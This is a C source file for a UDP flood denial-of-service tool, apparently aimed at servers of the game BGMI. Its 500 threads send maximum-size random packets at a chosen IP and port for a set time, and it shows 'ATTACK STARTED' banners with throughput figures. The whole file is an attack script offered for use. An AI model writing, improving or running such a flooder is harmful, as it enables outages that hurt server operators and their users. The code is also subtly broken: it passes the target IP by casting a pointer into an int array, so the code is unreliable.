#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

#define PKT 65507
#define BURST 5000
#define THREADS 500

volatile int run=1;
volatile unsigned long long p=0,b=0;

void* flood(void* arg) {
    char* ip=(char*)arg;
    int port=((int*)arg)[1];
    int sec=((int*)arg)[2];
    
    int sock=socket(AF_INET,SOCK_DGRAM,0);
    int buf=33554432;
    setsockopt(sock,SOL_SOCKET,SO_SNDBUF,&buf,sizeof(buf));
    
    struct sockaddr_in target;
    target.sin_family=AF_INET;
    target.sin_port=htons(port);
    target.sin_addr.s_addr=inet_addr(ip);
    
    char packet[PKT];
    for(int i=0;i<PKT;i++) packet[i]=rand()%256;
    
    time_t end=time(0)+sec;
    unsigned long long lp=0,lb=0;
    
    while(run && time(0)<end){
        for(int i=0;i<BURST;i++){
            sendto(sock,packet,PKT,0,(void*)&target,sizeof(target));
            lp++; lb+=PKT;
        }
        __sync_fetch_and_add(&p,lp);
        __sync_fetch_and_add(&b,lb);
        lp=0; lb=0;
    }
    close(sock);
    return NULL;
}

int main(int argc,char* argv[]){
    if(argc<4){
        printf("\n🔥 90GBPS BGMI ULTIMATE 🔥\n");
        printf("Usage: ./soul <IP> <PORT> <TIME>\n");
        return 1;
    }
    
    char* ip=argv[1];
    int port=atoi(argv[2]);
    int sec=atoi(argv[3]);
    
    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║   🔥 90GBPS BGMI 4.3 ULTIMATE 🔥          ║\n");
    printf("╠════════════════════════════════════════════╣\n");
    printf("║ Target : %s:%d\n",ip,port);
    printf("║ Time   : %d seconds\n",sec);
    printf("║ Threads: %d\n",THREADS);
    printf("╚════════════════════════════════════════════╝\n");
    
    pthread_t threads[THREADS];
    int args[3];
    args[0]=(int)ip;
    args[1]=port;
    args[2]=sec;
    
    for(int i=0;i<THREADS;i++){
        pthread_create(&threads[i],NULL,flood,args);
    }
    
    printf("\n🚀 ATTACK STARTED! 90+ GBPS\n\n");
    
    time_t start=time(0);
    unsigned long long last_b=0;
    
    while(run && (time(0)-start)<sec){
        sleep(1);
        int elapsed=time(0)-start;
        unsigned long long cb=b;
        double gbps=((cb-last_b)*8.0)/1e9;
        double avg=((cb)*8.0)/elapsed/1e9;
        
        printf("\r[%3ds] ⚡ Speed: %5.2f Gbps | 📊 Avg: %5.2f Gbps   ",elapsed,gbps,avg);
        fflush(stdout);
        last_b=cb;
    }
    
    run=0;
    for(int i=0;i<THREADS;i++) pthread_join(threads[i],NULL);
    
    double final_gbps=(b*8.0)/sec/1e9;
    printf("\n\n✅ ATTACK COMPLETE! Avg Speed: %.2f Gbps\n",final_gbps);
    
    if(final_gbps>=90) printf("\n🏆 90+ GBPS ACHIEVED! 🏆\n");
    
    return 0;
}
